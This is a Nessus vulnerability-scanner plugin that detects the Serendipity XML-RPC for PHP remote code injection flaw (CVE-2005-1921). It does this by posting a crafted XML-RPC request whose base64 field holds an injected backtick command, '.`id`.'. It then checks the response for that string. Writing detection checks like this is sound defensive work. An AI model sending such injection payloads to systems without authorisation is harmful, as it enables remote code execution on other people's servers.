#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18600);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2005-1921");
  script_bugtraq_id(14088);
  script_osvdb_id(17793);

  script_name(english:"Serendipity XML-RPC for PHP Remote Code Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a remote
code injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of Serendipity installed on the remote host is prone to
remote code execution due to a failure of its bundled XML-RPC library
to sanitize user-supplied input to the 'serendipity_xmlrpc.php'
script.  This flaw may allow attackers to execute code remotely
subject to the privileges of the web server userid." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Jun/286" );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory-022005.php" );
  # http://blog.s9y.org/archives/36-CRITICAL-BUGFIX-RELEASE-Serendipity-0.8.2.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?041cce31" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Serendipity version 0.8.2 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'PHP XML-RPC Arbitrary Code Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/29");
 script_cvs_date("$Date: 2016/11/03 21:08:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:s9y:serendipity");
script_end_attributes();

  script_summary(english:"Checks for XML-RPC for PHP remote code injection vulnerability in Serendipity");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencies("serendipity_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/serendipity");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/serendipity"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script exists.
  w = http_send_recv3(method:"GET", item:string(dir, "/serendipity_xmlrpc.php"), port:port);
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # If it does...
  if ("XML error: no element found at line 1" >< res) {
    # Try to exploit the flaw.
    postdata = string(
      '<?xml version="1.0"?>',
      "<methodCall>",
      "<methodName>blogger.getUsersBlogs</methodName>",
        "<params>",
          "<param><value><string>nessus</string></value></param>",
          "<param><value><string>", SCRIPT_NAME, "</string></value></param>",
          # nb: the actual command doesn't matter for our purposes: it
          #     will just be used for the password (base64 decoded :-).
          "<param><value><base64>'.`id`.'</base64></value></param>",
        "</params>",
      "</methodCall>"
    );
    w = http_send_recv3(method: "POST", port:port,
      item: dir+"/serendipity_xmlrpc.php",
      content_type: "text/xml", data: postdata);
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];
     # There's a problem if we see the code in the XML debug output.
    if ("base64_decode(''.`id`.'')" >< res) {
      security_hole(port);
      exit(0);
    }
  }
}
